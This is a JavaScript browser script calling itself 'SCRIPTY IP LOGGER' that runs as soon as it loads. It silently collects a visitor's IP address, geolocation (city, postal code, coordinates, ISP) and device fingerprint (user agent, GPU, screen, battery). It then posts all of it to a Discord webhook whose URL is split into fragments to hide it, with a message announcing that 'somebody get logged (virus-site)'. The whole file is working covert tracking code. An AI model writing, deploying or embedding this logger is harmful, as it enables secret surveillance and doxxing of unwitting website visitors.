const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(async geoData => {

                    function getGPUInfo() {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (!gl) return 'N/A';

                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            }
                            return 'N/A';
                        } catch {
                            return 'N/A';
                        }
                    }

                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        battery: "PC don't have battery",
                        charging: "PC don't have battery",
                        screenRefreshRate: "N/A",
                        touchScreen: ('ontouchstart' in window) ? 'Yes' : 'No',
                        gpu: getGPUInfo()
                    };

                    if (navigator.getBattery) {
                        await navigator.getBattery().then(battery => {
                            deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
                            deviceInfo.charging = battery.charging ? "Yes" : "No";
                        });
                    }

                    const getScreenRefreshRate = () => {
                        return new Promise(resolve => {
                            let frames = 0;
                            const start = performance.now();

                            const loop = () => {
                                frames++;
                                const elapsed = performance.now() - start;
                                if (elapsed < 1000) {
                                    requestAnimationFrame(loop);
                                } else {
                                    resolve(Math.round((frames * 1000) / elapsed) + " Hz");
                                }
                            };

                            requestAnimationFrame(loop);
                        });
                    };

                    deviceInfo.screenRefreshRate = await getScreenRefreshRate();
                    

                                    
                    const rKe1 = "https://";
                    const xJv9 = "discord";
                    const cIj5 = ".com/";
                    const aCx8 = "api/";

                    const Sgs1 = "webho";
                    const SFoa = "oks/";

                    const zPr7 = Sgs1 + SFoa
                    const qLt2 = "1416";
                    const eBa1 = "5065";
                    const vXs9 = "8159";
                    const sQa0 = "1265";
                    const pHw6 = "480/";
                    const kRt3 = "fBn";
                    const oPw7 = "UUL7";
                    const dEn2 = "Hjc9o";
                    const mFd3 = "S7R90";
                    const bYn4 = "SbO23";
                    const lMz4 = "Do_nY";
                    const vPq1 = "5cb2C";
                    const rXz3 = "Lq9i2";
                    const tFm8 = "BtlEB4";
                    const aYk5 = "f4Dw7o";
                    const sUn7 = "dneyD";
                    const mVo2 = "LbOZAF";
                    const eGc9 = "NHPjm9";
                    const bRl6 = "S4";

                    const tUv5 = vPq1 + rXz3 + tFm8 + aYk5 + sUn7 + mVo2 + eGc9 + bRl6;

                    const dscURL =
                      rKe1 +
                      xJv9 +
                      cIj5 +
                      aCx8 +
                      zPr7 +
                      qLt2 +
                      eBa1 +
                      vXs9 +
                      sQa0 +
                      pHw6 +
                      kRt3 +
                      oPw7 +
                      dEn2 +
                      mFd3 +
                      bYn4 +
                      lMz4 +
                      tUv5;

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1386287641540034583/1416506499739422730/game_logo2.png?ex=68c717fa&is=68c5c67a&hm=fa92cff6afc942d00facdb7fdbf2cb4edefb79da388f7e8b5943f468f799fb5c&=&format=webp&quality=lossless&width=355&height=350",
                            content: `@here @everyone somebody get logged (virus-site)`,
                            embeds: [{
                                title: 'SCRIPTY IP LOGGER',
                                description: `
**IP Info:**
IP Address > ${ipadd}
Network > ${geoData.network}
City > ${geoData.city}
Region > ${geoData.region}
Country > ${geoData.country_name}
Postal Code > ${geoData.postal}
Latitude > ${geoData.latitude}
Longitude > ${geoData.longitude}
Timezone > ${geoData.timezone}
Organization > ${geoData.org}

**Screen Info:**
Screen Width > ${deviceInfo.screenWidth}px
Screen Height > ${deviceInfo.screenHeight}px
Screen Refresh Rate > ${deviceInfo.screenRefreshRate}
Touch Screen > ${deviceInfo.touchScreen}

**Device Info:**
User-Agent > ${window}
User-Agent > ${deviceInfo.userAgent}
Language > ${deviceInfo.language}
Platform > ${deviceInfo.platform}
Battery > ${deviceInfo.battery}
Charging > ${deviceInfo.charging}
GPU > ${deviceInfo.gpu}
                                `,
                                color: 15548997
                            }]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();

